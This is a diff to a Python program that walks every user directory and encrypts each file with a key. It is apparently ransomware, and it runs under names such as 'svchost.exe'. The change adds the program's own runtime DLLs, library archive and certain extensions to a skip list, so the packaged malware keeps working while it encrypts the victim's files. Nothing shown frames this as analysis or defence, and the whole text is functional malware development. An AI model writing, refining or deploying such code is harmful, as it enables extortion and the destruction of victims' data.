@@ -32,13 +32,14 @@ def filelist():
     for user in rep:
         for root, dirs, files in os.walk(user):
             for file in files:
-                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg"):
+                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg" and file != "vcruntime140.dll" and file != "python37.dll" and file != "tk86t.dll" and file != "tcl86t.dll" and file != "library.zip" and file != "tclIndex"):
                     for ext in file.split("."):
-                        try:
-                            if file.endswith(ext):
-                                ally = os.path.join(root, file)
-                                file_ecrypt(key, ally)
-                        except PermissionError:
-                            pass
-                        except:
-                            pass
+                        if(file.endswith(ext)):
+                            if(ext != "pyc" and ext != "pyd" and ext != "tcl" and ext != "h" and ext != "msg" and ext != "enc"):
+                                try:
+                                    ally = os.path.join(root, file)
+                                    file_ecrypt(key, ally)
+                                except PermissionError:
+                                    pass
+                                except:
+                                    pass
